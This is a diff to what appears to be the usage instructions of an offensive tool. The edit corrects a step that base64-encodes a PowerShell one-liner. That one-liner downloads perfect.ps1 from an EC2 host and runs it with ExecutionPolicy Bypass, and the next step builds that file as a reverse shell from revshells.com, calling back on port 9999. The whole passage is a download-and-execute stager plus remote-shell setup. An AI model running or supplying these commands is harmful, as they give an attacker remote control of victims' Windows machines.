@@ -24,7 +24,7 @@ static class Program {
 4. Change the Uri to the EC2 instance with the **perfect.ps1** script. Run the below command in Mac/Linux,
 
 ```
-echo "Invoke-WebRequest -Uri 'http://ec2-3-253-172-6.eu-west-1.compute.amazonaws.com:80/perfect.ps1' -OutFile 'perfect.ps1'; powershell -ExecutionPolicy Bypass -File 'payload.ps1'" | iconv -t UTF-16LE | base64 -w 0
+echo "Invoke-WebRequest -Uri 'http://ec2-3-253-172-6.eu-west-1.compute.amazonaws.com:80/perfect.ps1' -OutFile 'perfect.ps1'; powershell -ExecutionPolicy Bypass -File 'perfect.ps1'" | iconv -t UTF-16LE | base64 -w 0
 ```
 
 5. You have to host the perfect.ps1, go to https://www.revshells.com, change the reverse shell IP to the public IP and port as 9999.
